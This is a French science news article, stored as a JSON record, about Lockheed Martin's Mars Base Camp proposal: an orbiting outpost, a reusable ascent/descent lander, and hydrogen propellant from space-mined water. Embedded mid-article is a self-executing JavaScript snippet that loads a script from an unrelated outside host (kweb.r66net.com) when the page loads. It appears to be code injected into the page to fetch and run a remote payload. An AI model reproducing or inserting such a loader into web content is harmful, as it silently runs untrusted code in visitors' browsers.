{"title": "Exploration humaine de Mars : Lockheed Martin se lance dans la course", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-10-11", "content": "Constructeur, notamment, des sondes martiennes MRO et Maven, Lockheed Martin presente son nouveau projet de missions habitees a destination de Mars. Tres different de celui de SpaceX, il prevoit le retour sur Terre des premiers explorateurs ainsi qu'une base en orbite autour de la planete. Plus credible ? Ce qu'il faut retenir La firme Lockheed Martin avait deja elabore un projet de missions habitees en orbite autour de Mars. Une nouvelle version prevoit une navette pour deposer des astronautes a la surface de la planete. L'entreprise imagine une exploitation des ressources de l'espace, en particulier la production d'eau, qui serait confiee a des services prives. SpaceX  n'est pas la seule societe qui etudie des scenarios de  missions habitees vers Mars . Lockheed Martin, acteur historique du secteur spatial americain et partenaire de longue date de la Nasa, a egalement un projet de mission habitee a destination de Mars. Ce projet,  Mars base camp , sorte d'avant-poste en  orbite  autour de Mars, a ete presente lors du sommet  Humains vers Mars  qui s'etait tenu a Washington en mars 2016. Depuis cet orbiteur, il serait possible de realiser une multitude d'activites et d'observations. Ainsi l'equipage pourra diriger quasiment en temps reel les  robots  martiens alors que, depuis la  Terre , le delai varie de 3 a 21 minutes. Les  astronautes  pourraient reperer des sites d'atterrissage possibles, recolter des  echantillons sur Mars  et s'aventurer a proximite de  Deimos  et  Phobos , les deux satellites naturels de Mars. Enfin, cet avant-poste servira de point de depart pour les premiers humains qui fouleront le sol martien. Lors du 68 e  congres international d' astronautique  qui vient de se tenir dans la ville d'Adelaide, en Australie, la societe a presente une nouvelle mouture de l'architecture de son projet, avec l'ajout d'un systeme de transport capable de realiser jusqu'a six allers-retours entre la surface de Mars et l'orbite. A chaque rotation, quatre astronautes pourraient descendre sur Mars et y sejourner deux ou trois semaines. Ce MADV ( Mars Ascent/Descent Vehicle ) atterrira et decollera a la verticale, la faible  atmosphere  martienne compliquant beaucoup la realisation d'un avion, sans compter la difficulte de realiser une piste, qui devrait etre tres longue. Concept de vehicule de liaison entre le sol martien et la base en orbite autour de la Planete rouge. (c) Lockheed Martin                       Une economie spatiale de l'eau La station en orbite et le MADV fonctionneront tous les deux avec un melange d' oxygene  et d' hydrogene  liquides. Le choix de l'hydrogene comme carburant, plutot que le methane, peut surprendre. Le methane liquide, plus facile a stocker, a par exemple ete choisi par SpaceX pour son futur  ITS  ( Interplanetary Transport System ). Mais pour Lockheed Martin, l'exploration du  Systeme solaire  s'accompagnera necessairement de l'utilisation des ressources spatiales, notamment l'eau extraite de la  Lune  ou des  asteroides . Elle ne sera pas seulement utilisee pour la consommation humaine mais aussi pour la production d'oxygene et d'hydrogene, utilises comme  ergols . Le developpement de cette economie de l'eau est l'une des raisons pour lesquelles la societe a choisi l'hydrogene liquide et non le methane pour ses systemes de propulsion.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Plus surprenant encore, Lockheed Martin souhaite que cette eau spatiale soit fournie par des societes privees. Si les premieres missions utiliseront de l'eau probablement venue de la Terre, le developpement d'un service commercial de fourniture d'eau, produite grace a des materiaux extraits d'asteroides, de la surface de Mars ou, idealement, des lunes de Mars, est encourage. Cette production spatiale, evitant l'enorme consommation d' energie  pour l'arracher a la  gravite  terrestre, representerait une opportunite de reduction importante du cout de l'exploration durable du systeme solaire. Le saviez-vous ? L'architecture de ce camp de base martien correspond aux concepts etudies par la Nasa et l'Agence spatiale europeenne d'un avant-poste lunaire pour l'exploration habitee qui pourrait etre installe sur une orbite << cislunaire >> d'ici quelques annees. Or, scientifiques et responsables d'agences se font a l'idee que la conquete de Mars, plutot que de partir de la Terre, s'organisera depuis une base lunaire.  Il pourrait donc tres bien servir un temps autour de la Lune, de facon a demontrer l'interet et la faisabilite technique de l'utiliser en orbite autour de Mars avant de l'envoyer a destination de la Planete rouge. Voyage vers Mars : l'Homme y survivrait-il ?                       Un vol habite vers Mars comporte evidemment des enjeux techniques, mais aussi des enjeux sociaux et psychologiques auxquels on ne pense pas forcement au premier abord. Futura-Sciences a interviewe Charles Frankel, planetologue, pour qu'il nous parle des relations entre astronautes durant un vol habite de ce type.                                       ", "theme": "sciences"}